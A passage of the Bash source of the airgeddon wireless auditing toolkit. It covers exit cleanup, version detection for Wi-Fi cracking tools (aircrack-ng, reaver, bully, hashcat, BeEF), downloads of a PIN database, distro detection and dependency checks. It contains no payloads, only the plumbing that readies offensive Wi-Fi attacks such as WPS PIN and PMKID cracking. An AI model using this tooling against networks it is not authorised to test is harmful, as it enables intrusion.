#Show message for invalid selected option
function invalid_menu_option() {

	debug_print

	echo
	language_strings "${language}" 76 "red"
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected interface
function invalid_iface_selected() {

	debug_print

	echo
	language_strings "${language}" 77 "red"
	echo
	language_strings "${language}" 115 "read"
	echo
	select_interface
}

#Show message for invalid selected secondary interface
function invalid_secondary_iface_selected() {

	debug_print

	echo
	language_strings "${language}" 77 "red"
	echo
	language_strings "${language}" 115 "read"
	echo
	select_secondary_et_interface "${1}"
}

#Manage behavior of captured traps
function capture_traps() {

	debug_print

	if [ "${FUNCNAME[1]}" != "check_language_strings" ]; then
		case "${1}" in
			INT|SIGTSTP)
				case ${current_menu} in
					"pre_main_menu"|"select_interface_menu")
						exit_code=1
						exit_script_option
					;;
					*)
						ask_yesno 12 "yes"
						if [ "${yesno}" = "y" ]; then
							exit_code=1
							exit_script_option
						else
							language_strings "${language}" 224 "blue"
							if [ "${last_buffered_type1}" = "read" ]; then
								language_strings "${language}" "${last_buffered_message2}" "${last_buffered_type2}"
							else
								language_strings "${language}" "${last_buffered_message1}" "${last_buffered_type1}"
							fi
						fi
					;;
				esac
			;;
			SIGINT|SIGHUP)
				if [ "${no_hardcore_exit}" -eq 0 ]; then
					hardcore_exit
				else
					exit ${exit_code}
				fi
			;;
		esac
	else
		echo
		hardcore_exit
	fi
}

#Exit the script managing possible pending tasks
function exit_script_option() {

	debug_print

	action_on_exit_taken=0
	echo
	language_strings "${language}" 106 "title"
	language_strings "${language}" 11 "blue"

	echo
	language_strings "${language}" 165 "blue"

	if [ "${ifacemode}" = "Monitor" ]; then
		ask_yesno 166 "no"
		if [ "${yesno}" = "n" ]; then
			action_on_exit_taken=1
			language_strings "${language}" 167 "multiline"
			if [ "${interface_airmon_compatible}" -eq 1 ]; then
				${airmon} stop "${interface}" > /dev/null 2>&1
			else
				set_mode_without_airmon "${interface}" "managed"
			fi
			ifacemode="Managed"
			time_loop
			echo -e "${green_color} Ok\r${normal_color}"
		fi
	fi

	if [ ${nm_processes_killed} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 168 "multiline"
		eval "${networkmanager_cmd} > /dev/null 2>&1"
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ ${tmpfiles_toclean} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 164 "multiline"
		clean_tmpfiles
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ ${routing_modified} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 297 "multiline"
		clean_routing_rules
		kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
		kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
		kill_beef
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [[ ${spoofed_mac} -eq 1 ]] && [[ "${ifacemode}" = "Managed" ]]; then
		language_strings "${language}" 418 "multiline"
		restore_spoofed_macs
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ ${action_on_exit_taken} -eq 0 ]; then
		language_strings "${language}" 160 "yellow"
	fi

	echo
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		clean_env_vars
		no_hardcore_exit=1
		if ! kill_tmux_session "${session_name}" > /dev/null; then
			exit ${exit_code}
		fi
	else
		clean_env_vars
		exit ${exit_code}
	fi
}

#Exit the script managing possible pending tasks but not showing anything
function hardcore_exit() {

	debug_print

	exit_code=2
	if [ "${ifacemode}" = "Monitor" ]; then
		${airmon} stop "${interface}" > /dev/null 2>&1
		ifacemode="Managed"
	fi

	if [ ${nm_processes_killed} -eq 1 ]; then
		eval "${networkmanager_cmd} > /dev/null 2>&1"
	fi

	if [ ${tmpfiles_toclean} -eq 1 ]; then
		clean_tmpfiles
	fi

	if [ ${routing_modified} -eq 1 ]; then
		clean_routing_rules
		kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
		kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
		kill_beef
	fi

	if [[ ${spoofed_mac} -eq 1 ]] && [[ "${ifacemode}" = "Managed" ]]; then
		language_strings "${language}" 418 "multiline"
		restore_spoofed_macs
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		clean_env_vars
		if ! kill_tmux_session "${session_name}"; then
			exit ${exit_code}
		fi
	else
		clean_env_vars
		exit ${exit_code}
	fi
}

#Generate a small time loop printing some dots
function time_loop() {

	debug_print

	echo -ne " "
	for (( j=1; j<=4; j++ )); do
		echo -ne "."
		sleep 0.035
	done
}

#Detect iptables/nftables
function iptables_nftables_detection() {

	debug_print

	if ! "${AIRGEDDON_FORCE_IPTABLES:-false}"; then
		if hash nft 2> /dev/null; then
			iptables_nftables=1
		else
			iptables_nftables=0
		fi
	else
		if ! hash iptables 2> /dev/null && ! hash iptables-legacy 2> /dev/null; then
			echo
			language_strings "${language}" 615 "red"
			exit_code=1
			exit_script_option
		else
			iptables_nftables=0
		fi
	fi

	if [ "${iptables_nftables}" -eq 0 ]; then
		if hash iptables-legacy 2> /dev/null; then
			iptables_cmd="iptables-legacy"
		else
			iptables_cmd="iptables"
		fi
	else
		iptables_cmd="nft"
	fi
}

#Determine which version of airmon to use
function airmon_fix() {

	debug_print

	airmon="airmon-ng"

	if hash airmon-zc 2> /dev/null; then
		airmon="airmon-zc"
	fi
}

#Set hashcat parameters based on version
function set_hashcat_parameters() {

	debug_print

	hashcat_cmd_fix=""
	hashcat_charset_fix_needed=0
	if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat3_version}"; then

		hashcat_charset_fix_needed=1

		if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat4_version}"; then
			hashcat_cmd_fix=" -D 1 --force"
		else
			hashcat_cmd_fix=" --weak-hash-threshold 0 -D 1 --force"
		fi

		if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_hccapx_version}"; then
			hccapx_needed=1
		fi
	fi
}

#Determine aircrack version
#shellcheck disable=SC2034
function get_aircrack_version() {

	debug_print

	aircrack_version=$(aircrack-ng --help | grep -i "aircrack-ng" | head -n 1 | awk '{print $2}')
	echo -e "    \r\033[1A"
	[[ ${aircrack_version} =~ ^([0-9]{1,2}\.[0-9]{1,2})\.?([0-9]+|.+)? ]] && aircrack_version="${BASH_REMATCH[1]}"
}

#Determine john the ripper version
#shellcheck disable=SC2034
function get_jtr_version() {

	debug_print

	jtr_version=$(john --help | grep -Eio 'version [a-z0-9\.]+' | awk '{print $2}')
}

#Determine hashcat version
function get_hashcat_version() {

	debug_print

	hashcat_version=$(hashcat -V 2> /dev/null)
	hashcat_version=${hashcat_version#"v"}
}

#Determine hcxdumptool version
function get_hcxdumptool_version() {

	debug_print

	hcxdumptool_version=$(hcxdumptool --version | awk '{print $2}')
}

#Determine beef version
function get_beef_version() {

	debug_print

	beef_version=$(grep "version" "${beef_path}${beef_default_cfg_file}" 2> /dev/null | grep -oE "[0-9.]+")
}

#Determine bettercap version
function get_bettercap_version() {

	debug_print

	bettercap_version=$(bettercap -v 2> /dev/null | grep -E "^bettercap [0-9]" | awk '{print $2}')
	if [ -z "${bettercap_version}" ]; then
		bettercap_version=$(bettercap -eval "q" 2> /dev/null | grep -E "bettercap v[0-9\.]*" | awk '{print $2}')
		bettercap_version=${bettercap_version#"v"}
	fi
}

#Determine bully version
function get_bully_version() {

	debug_print

	bully_version=$(bully -V 2> /dev/null)
	bully_version=${bully_version#"v"}
	bully_version=${bully_version%"-"*}
}

#Determine reaver version
function get_reaver_version() {

	debug_print

	reaver_version=$(reaver -h 2>&1 > /dev/null | grep -E "^Reaver v[0-9]" | awk '{print $2}' | grep -Eo "v[0-9\.]+")
	if [ -z "${reaver_version}" ]; then
		reaver_version=$(reaver -h 2> /dev/null | grep -E "^Reaver v[0-9]" | awk '{print $2}' | grep -Eo "v[0-9\.]+")
	fi
	reaver_version=${reaver_version#"v"}
}

#Set verbosity for bully based on version
function set_bully_verbosity() {

	debug_print

	if compare_floats_greater_or_equal "${bully_version}" "${minimum_bully_verbosity4_version}"; then
		bully_verbosity="4"
	else
		bully_verbosity="3"
	fi
}

#Validate if bully version is able to perform integrated pixiewps attack
function validate_bully_pixiewps_version() {

	debug_print

	if compare_floats_greater_or_equal "${bully_version}" "${minimum_bully_pixiewps_version}"; then
		return 0
	fi
	return 1
}

#Validate if reaver version is able to perform integrated pixiewps attack
function validate_reaver_pixiewps_version() {

	debug_print

	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_pixiewps_version}"; then
		return 0
	fi
	return 1
}

#Validate if reaver version is able to perform null pin attack
function validate_reaver_nullpin_version() {

	debug_print

	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_nullpin_version}"; then
		return 0
	fi
	return 1
}

#Validate if wash version is able to perform 5Ghz dual scan
function validate_wash_dualscan_version() {

	debug_print

	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_wash_dualscan_version}"; then
		return 0
	fi
	return 1
}

#Validate if hashcat version is able to perform pmkid cracking
function validate_hashcat_pmkid_version() {

	debug_print

	if compare_floats_greater_or_equal "${hashcat_version}" "${minimum_hashcat_pmkid_version}"; then
		return 0
	fi
	return 1
}

#Set the script folder var if necessary
function set_script_paths() {

	debug_print

	if [ -z "${scriptfolder}" ]; then
		scriptfolder=${0}

		if ! [[ ${0} =~ ^/.*$ ]]; then
			if ! [[ ${0} =~ ^.*/.*$ ]]; then
				scriptfolder="./"
			fi
		fi
		scriptfolder="${scriptfolder%/*}/"
		scriptname="${0##*/}"
	fi

	user_homedir=$(env | grep ^HOME | awk -F = '{print $2}' 2> /dev/null)
	lastcharuser_homedir=${user_homedir: -1}
	if [ "${lastcharuser_homedir}" != "/" ]; then
		user_homedir="${user_homedir}/"
	fi

	plugins_paths=(
					"${scriptfolder}${plugins_dir}"
					"${user_homedir}.airgeddon/${plugins_dir}"
				)
}

#Set the default directory for saving files
function set_default_save_path() {

	debug_print

	if [ "${is_docker}" -eq 1 ]; then
		default_save_path="${docker_io_dir}"
	else
		default_save_path="${user_homedir}"
	fi
}

#Check if pins database file exist and try to download the new one if proceed
function check_pins_database_file() {

	debug_print

	if [ -f "${scriptfolder}${known_pins_dbfile}" ]; then
		language_strings "${language}" 376 "yellow"
		echo
		language_strings "${language}" 287 "blue"
		if check_repository_access; then
			get_local_pin_dbfile_checksum "${scriptfolder}${known_pins_dbfile}"
			if ! get_remote_pin_dbfile_checksum; then
				echo
				language_strings "${language}" 381 "yellow"
			else
				echo
				if [ "${local_pin_dbfile_checksum}" != "${remote_pin_dbfile_checksum}" ]; then
					language_strings "${language}" 383 "yellow"
					echo
					if download_pins_database_file; then
						language_strings "${language}" 377 "yellow"
						pin_dbfile_checked=1
					else
						language_strings "${language}" 378 "yellow"
					fi
				else
					language_strings "${language}" 382 "yellow"
					pin_dbfile_checked=1
				fi
			fi
		else
			echo
			language_strings "${language}" 375 "yellow"
			ask_for_pin_dbfile_download_retry
		fi
		return 0
	else
		language_strings "${language}" 374 "yellow"
		echo
		if hash curl 2> /dev/null; then
			language_strings "${language}" 287 "blue"
			if ! check_repository_access; then
				echo
				language_strings "${language}" 375 "yellow"
				return 1
			else
				echo
				if download_pins_database_file; then
					language_strings "${language}" 377 "yellow"
					pin_dbfile_checked=1
					return 0
				else
					language_strings "${language}" 378 "yellow"
					return 1
				fi
			fi
		else
			language_strings "${language}" 414 "yellow"
			return 1
		fi
	fi
}

#Get and write options form options config file
function update_options_config_file() {

	debug_print

	case "${1}" in
		"getdata")
			readarray -t OPTION_VARS < <(grep "AIRGEDDON_" "${rc_path}" 2> /dev/null)
		;;
		"writedata")
			local option_name
			local option_value
			for item in "${OPTION_VARS[@]}"; do
				option_name="${item%=*}"
				option_value="${item#*=}"
				for item2 in "${ordered_options_env_vars[@]}"; do
					if [ "${item2}" = "${option_name}" ]; then
						sed -ri "s:(${option_name})=(.+):\1=${option_value}:" "${rc_path}" 2> /dev/null
					fi
				done
			done
		;;
	esac
}

#Download the options config file
function download_options_config_file() {

	debug_print

	local options_config_file_downloaded=0
	options_config_file=$(timeout -s SIGTERM 15 curl -L ${urlscript_options_config_file} 2> /dev/null)

	if [[ -n "${options_config_file}" ]] && [[ "${options_config_file}" != "${curl_404_error}" ]]; then
		options_config_file_downloaded=1
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			options_config_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_options_config_file} 2> /dev/null)
			if [[ -n "${options_config_file}" ]] && [[ "${options_config_file}" != "${curl_404_error}" ]]; then
				options_config_file_downloaded=1
			fi
		fi
	fi

	if [ "${options_config_file_downloaded}" -eq 1 ]; then
		rm -rf "${rc_path}" 2> /dev/null
		echo "${options_config_file}" > "${rc_path}"
		return 0
	else
		return 1
	fi
}

#Download the pins database file
function download_pins_database_file() {

	debug_print

	local pindb_file_downloaded=0
	remote_pindb_file=$(timeout -s SIGTERM 15 curl -L ${urlscript_pins_dbfile} 2> /dev/null)

	if [[ -n "${remote_pindb_file}" ]] && [[ "${remote_pindb_file}" != "${curl_404_error}" ]]; then
		pindb_file_downloaded=1
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_pindb_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_pins_dbfile} 2> /dev/null)
			if [[ -n "${remote_pindb_file}" ]] && [[ "${remote_pindb_file}" != "${curl_404_error}" ]]; then
				pindb_file_downloaded=1
			fi
		fi
	fi

	if [ "${pindb_file_downloaded}" -eq 1 ]; then
		rm -rf "${scriptfolder}${known_pins_dbfile}" 2> /dev/null
		echo "${remote_pindb_file}" > "${scriptfolder}${known_pins_dbfile}"
		return 0
	else
		return 1
	fi
}

#Ask for try to download pin db file again and set the var to skip it
function ask_for_pin_dbfile_download_retry() {

	debug_print

	ask_yesno 380 "no"
	if [ "${yesno}" = "n" ]; then
		pin_dbfile_checked=1
	fi
}

#Get the checksum for local pin database file
function get_local_pin_dbfile_checksum() {

	debug_print

	local_pin_dbfile_checksum=$(md5sum "${1}" | awk '{print $1}')
}

#Get the checksum for remote pin database file
function get_remote_pin_dbfile_checksum() {

	debug_print

	remote_pin_dbfile_checksum=$(timeout -s SIGTERM 15 curl -L ${urlscript_pins_dbfile_checksum} 2> /dev/null | head -n 1)

	if [[ -n "${remote_pin_dbfile_checksum}" ]] && [[ "${remote_pin_dbfile_checksum}" != "${curl_404_error}" ]]; then
		return 0
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_pin_dbfile_checksum=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_pins_dbfile_checksum} 2> /dev/null | head -n 1)
			if [[ -n "${remote_pin_dbfile_checksum}" ]] && [[ "${remote_pin_dbfile_checksum}" != "${curl_404_error}" ]]; then
				return 0
			fi
		fi
	fi
	return 1
}

#Check for possible non Linux operating systems
function non_linux_os_check() {

	debug_print

	case "${OSTYPE}" in
		solaris*)
			distro="Solaris"
		;;
		darwin*)
			distro="Mac OSX"
		;;
		bsd*)
			distro="FreeBSD"
		;;
	esac
}

#First phase of Linux distro detection based on uname output
function detect_distro_phase1() {

	debug_print

	for i in "${known_compatible_distros[@]}"; do
		if uname -a | grep "${i}" -i > /dev/null; then
			distro="${i^}"
			break
		fi
	done
}

#Second phase of Linux distro detection based on architecture and version file
function detect_distro_phase2() {

	debug_print

	if [ "${distro}" = "Unknown Linux" ]; then
		if [ -f "${osversionfile_dir}centos-release" ]; then
			distro="CentOS"
		elif [ -f "${osversionfile_dir}fedora-release" ]; then
			distro="Fedora"
		elif [ -f "${osversionfile_dir}gentoo-release" ]; then
			distro="Gentoo"
		elif [ -f "${osversionfile_dir}openmandriva-release" ]; then
			distro="OpenMandriva"
		elif [ -f "${osversionfile_dir}redhat-release" ]; then
			distro="Red Hat"
		elif [ -f "${osversionfile_dir}SuSE-release" ]; then
			distro="SuSE"
		elif [ -f "${osversionfile_dir}debian_version" ]; then
			distro="Debian"
			if [ -f "${osversionfile_dir}os-release" ]; then
				extra_os_info="$(grep "PRETTY_NAME" < "${osversionfile_dir}os-release")"
				if [[ "${extra_os_info}" =~ Raspbian ]]; then
					distro="Raspbian"
					is_arm=1
				elif [[ "${extra_os_info}" =~ Parrot ]]; then
					distro="Parrot arm"
					is_arm=1
				fi
			fi
		fi
	elif [ "${distro}" = "Arch" ]; then
		if [ -f "${osversionfile_dir}os-release" ]; then
			extra_os_info="$(grep "PRETTY_NAME" < "${osversionfile_dir}os-release")"
			if [[ "${extra_os_info}" =~ BlackArch ]]; then
				distro="BlackArch"
			elif [[ "${extra_os_info}" =~ Kali ]]; then
				#Kali is intentionally here too to avoid some Kali arm distro bad detection
				distro="Kali"
				is_arm=1
			fi
		fi
	elif [ "${distro}" = "Ubuntu" ]; then
		if [ -f "${osversionfile_dir}os-release" ]; then
			extra_os_info="$(grep "PRETTY_NAME" < "${osversionfile_dir}os-release")"
			if [[ "${extra_os_info}" =~ Mint ]]; then
				distro="Mint"
			fi
		fi
	fi

	detect_arm_architecture
}

#Detect if arm architecture is present on system
function detect_arm_architecture() {

	debug_print

	distro_already_known=0

	if uname -m | grep -Ei "arm|aarch64" > /dev/null && [[ "${distro}" != "Unknown Linux" ]]; then

		for item in "${known_arm_compatible_distros[@]}"; do
			if [ "${distro}" = "${item}" ]; then
				distro_already_known=1
			fi
		done

		if [ ${distro_already_known} -eq 0 ]; then
			distro="${distro} arm"
			is_arm=1
		fi
	elif [[ "${distro}" != "Unknown Linux" ]] && [[ "${is_arm}" -eq 1 ]]; then
		distro="${distro} arm"
	fi
}

#Set some useful vars based on Linux distro
function special_distro_features() {

	debug_print

	case ${distro} in
		"Wifislax")
			networkmanager_cmd="service restart networkmanager"
			xratio=7
			yratio=15.1
			ywindow_edge_lines=1
			ywindow_edge_pixels=-14
		;;
		"Backbox")
			networkmanager_cmd="service network-manager restart"
			xratio=6
			yratio=14.2
			ywindow_edge_lines=1
			ywindow_edge_pixels=15
		;;
		"Ubuntu"|"Mint")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"Kali"|"Kali arm")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"Debian")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=14
		;;
		"SuSE")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"CentOS")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=14.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Parrot"|"Parrot arm")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Arch")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=16
		;;
		"Fedora")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6
			yratio=14.1
			ywindow_edge_lines=2
			ywindow_edge_pixels=16
		;;
		"Gentoo")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=14.6
			ywindow_edge_lines=1
			ywindow_edge_pixels=-10
		;;
		"Pentoo")
			networkmanager_cmd="rc-service NetworkManager restart"
			xratio=6.2
			yratio=14.6
			ywindow_edge_lines=1
			ywindow_edge_pixels=-10
		;;
		"Red Hat")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=15.3
			ywindow_edge_lines=1
			ywindow_edge_pixels=10
		;;
		"Cyborg")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=14.5
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"BlackArch")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=7.3
			yratio=14
			ywindow_edge_lines=1
			ywindow_edge_pixels=1
		;;
		"Raspbian")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=14
			ywindow_edge_lines=1
			ywindow_edge_pixels=20
		;;
		"OpenMandriva")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=14
			ywindow_edge_lines=2
			ywindow_edge_pixels=-10
		;;
	esac
}

#Determine if NetworkManager must be killed on your system. Only needed for previous versions of 1.0.12
function check_if_kill_needed() {

	debug_print

	nm_min_main_version="1"
	nm_min_subversion="0"
	nm_min_subversion2="12"

	if ! hash NetworkManager 2> /dev/null; then
		check_kill_needed=0
	else
		nm_system_version=$(NetworkManager --version 2> /dev/null)

		if [ "${nm_system_version}" != "" ]; then

			[[ ${nm_system_version} =~ ^([0-9]{1,2})\.([0-9]{1,2})\.?(([0-9]+)|.+)? ]] && nm_main_system_version="${BASH_REMATCH[1]}" && nm_system_subversion="${BASH_REMATCH[2]}" && nm_system_subversion2="${BASH_REMATCH[3]}"

			[[ ${nm_system_subversion2} =~ [a-zA-Z] ]] && nm_system_subversion2="0"

			if [ "${nm_main_system_version}" -lt ${nm_min_main_version} ]; then
				check_kill_needed=1
			elif [ "${nm_main_system_version}" -eq ${nm_min_main_version} ]; then

				if [ "${nm_system_subversion}" -lt ${nm_min_subversion} ]; then
					check_kill_needed=1
				elif [ "${nm_system_subversion}" -eq ${nm_min_subversion} ]; then

					if [ "${nm_system_subversion2}" -lt ${nm_min_subversion2} ]; then
						check_kill_needed=1
					fi
				fi
			fi
		else
			check_kill_needed=1
		fi
	fi
}

#Do some checks for some general configuration
function general_checkings() {

	debug_print

	compatible=0
	check_if_kill_needed

	if [ "${distro}" = "Unknown Linux" ]; then
		non_linux_os_check
		echo -e "${yellow_color}${distro}${normal_color}"
	else
		if [ "${is_docker}" -eq 1 ]; then
			echo -e "${yellow_color}${docker_based_distro} Linux ${pink_color}(${docker_image[${language}]})${normal_color}"
		else
			echo -e "${yellow_color}${distro} Linux${normal_color}"
		fi
	fi

	check_compatibility
	if [ ${compatible} -eq 1 ]; then
		return
	fi

	exit_code=1
	exit_script_option
}

#Check if the user is root
function check_root_permissions() {

	debug_print

	user=$(whoami)

	if [ "${user}" = "root" ]; then
		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo
			language_strings "${language}" 484 "yellow"
		fi
	else
		echo
		language_strings "${language}" 223 "red"
		exit_code=1
		exit_script_option
	fi
}

#Print Linux known distros
#shellcheck disable=SC2207
function print_known_distros() {

	debug_print

	all_known_compatible_distros=("${known_compatible_distros[@]}" "${known_arm_compatible_distros[@]}")
	IFS=$'\n'
	all_known_compatible_distros=($(printf "%s\n" "${all_known_compatible_distros[@]}" | sort))
	unset IFS

	for i in "${all_known_compatible_distros[@]}"; do
		echo -ne "${pink_color}\"${i}\" ${normal_color}"
	done
	echo
}

#Check if you have installed the tools (essential and optional) that the script uses
function check_compatibility() {

	debug_print

	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
		echo
		language_strings "${language}" 108 "blue"
		language_strings "${language}" 115 "read"

		echo
		language_strings "${language}" 109 "blue"
	fi

	essential_toolsok=1
	for i in "${essential_tools_names[@]}"; do
		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo -ne "${i}"
			time_loop
			if ! hash "${i}" 2> /dev/null; then
				echo -ne "${red_color} Error${normal_color}"
				essential_toolsok=0
				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
				echo -e "\r"
			else
				echo -e "${green_color} Ok\r${normal_color}"
			fi
		else
			if ! hash "${i}" 2> /dev/null; then
				essential_toolsok=0
			fi
		fi
	done

	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
		echo
		language_strings "${language}" 218 "blue"
	fi

	optional_toolsok=1
	for i in "${!optional_tools[@]}"; do
		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo -ne "${i}"
			time_loop
		fi
		if ! hash "${i}" 2> /dev/null; then
			if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
				echo -ne "${red_color} Error${normal_color}"
				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
				echo -e "\r"
			fi
			optional_toolsok=0
		else
			if [ "${i}" = "beef" ]; then
				detect_fake_beef
				if [ ${fake_beef_found} -eq 1 ]; then
					if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
						echo -ne "${red_color} Error${normal_color}"
						echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
						echo -e "\r"
					fi
					optional_toolsok=0
				else
					if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
						echo -e "${green_color} Ok\r${normal_color}"
					fi
					optional_tools[${i}]=1
				fi
			else
				if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
					echo -e "${green_color} Ok\r${normal_color}"
				fi
				optional_tools[${i}]=1
			fi
		fi
	done

	update_toolsok=1
	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then

		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo
			language_strings "${language}" 226 "blue"
		fi

		for i in "${update_tools[@]}"; do
			if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
				echo -ne "${i}"
				time_loop
				if ! hash "${i}" 2> /dev/null; then
					echo -ne "${red_color} Error${normal_color}"
					update_toolsok=0
					echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
					echo -e "\r"
				else
					echo -e "${green_color} Ok\r${normal_color}"
				fi
			else
				if ! hash "${i}" 2> /dev/null; then
					update_toolsok=0
				fi
			fi
		done
	fi

	if [ ${essential_toolsok} -eq 0 ]; then
		echo
		language_strings "${language}" 111 "red"
		echo
		if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
			language_strings "${language}" 581 "blue"
			echo
		fi
		language_strings "${language}" 115 "read"
		return
	fi

	compatible=1

	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
		if [ ${optional_toolsok} -eq 0 ]; then
			echo
			language_strings "${language}" 219 "yellow"

			if [ ${fake_beef_found} -eq 1 ]; then
				echo
				language_strings "${language}" 401 "red"
				echo
			fi
			return
		fi

		echo
		language_strings "${language}" 110 "yellow"
	fi
}

#Check for the minimum bash version requirement
function check_bash_version() {

	debug_print

	bashversion="${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"
	if compare_floats_greater_or_equal "${bashversion}" ${minimum_bash_version_required}; then
		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo
			language_strings "${language}" 221 "yellow"
		fi
	else
		echo
		language_strings "${language}" 222 "red"
		exit_code=1
		exit_script_option
	fi
}

#Check if you have installed the tools required to update the script
function check_update_tools() {

	debug_print

	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
		if [ ${update_toolsok} -eq 1 ]; then
			autoupdate_check
		else
			echo
			language_strings "${language}" 225 "yellow"
			language_strings "${language}" 115 "read"
		fi
	else
		if [ "${is_docker}" -eq 1 ]; then
			echo
			language_strings "${language}" 422 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if window size is enough for intro
function check_window_size_for_intro() {

	debug_print

	window_width=$(tput cols)
	window_height=$(tput lines)

	if [ "${window_width}" -lt 69 ]; then
		return 1
	elif [[ ${window_width} -ge 69 ]] && [[ ${window_width} -le 80 ]]; then
		if [ "${window_height}" -lt 20 ]; then
			return 1
		fi
	else
		if [ "${window_height}" -lt 19 ]; then
			return 1
		fi
	fi

	return 0
}

#Print the script intro
function print_intro() {

	debug_print

	echo -e "${yellow_color}                  .__                         .___  .___"
	sleep 0.15 && echo -e "           _____  |__|______  ____   ____   __| _/__| _/____   ____"
	sleep 0.15 && echo -e "           \__  \ |  \_  __ \/ ___\_/ __ \ / __ |/ __ |/  _ \ /    \\"
	sleep 0.15 && echo -e "            / __ \|  ||  | \/ /_/  >  ___// /_/ / /_/ (  <_> )   |  \\"
	sleep 0.15 && echo -e "           (____  /__||__|  \___  / \___  >____ \____ |\____/|___|  /"
	sleep 0.15 && echo -e "                \/         /_____/      \/     \/    \/           \/${normal_color}"
	echo
	language_strings "${language}" 228 "green"
	print_animated_flying_saucer
	sleep 1
}

#Generate the frames of the animated ascii art flying saucer
function flying_saucer() {

	debug_print

	case ${1} in
		1)
			echo "                                                             "
			echo "                         .   *       _.---._  *              "
			echo "                                   .'       '.       .       "
			echo "                               _.-~===========~-._          *"
			echo "                           *  (___________________)     .    "
			echo "                       .     .      \_______/    *           "
		;;
		2)
			echo "                        *         .  _.---._          .      "
			echo "                              *    .'       '.  .            "
			echo "                               _.-~===========~-._ *         "
			echo "                           .  (___________________)       *  "
			echo "                            *       \_______/        .       "
			echo "                                                             "
		;;
		3)
			echo "                                   *                .        "
			echo "                             *       _.---._              *  "
			echo "                          .        .'       '.       *       "
			echo "                       .       _.-~===========~-._     *     "
			echo "                              (___________________)         ."
			echo "                       *            \_______/ .              "
		;;
		4)
			echo "                        *         .  _.---._          .      "
			echo "                              *    .'       '.  .            "
			echo "                               _.-~===========~-._ *         "
			echo "                           .  (___________________)       *  "
			echo "                            *       \_______/        .       "
			echo "                                                             "
		;;
	esac
	sleep 0.4
}

#Print animated ascii art flying saucer
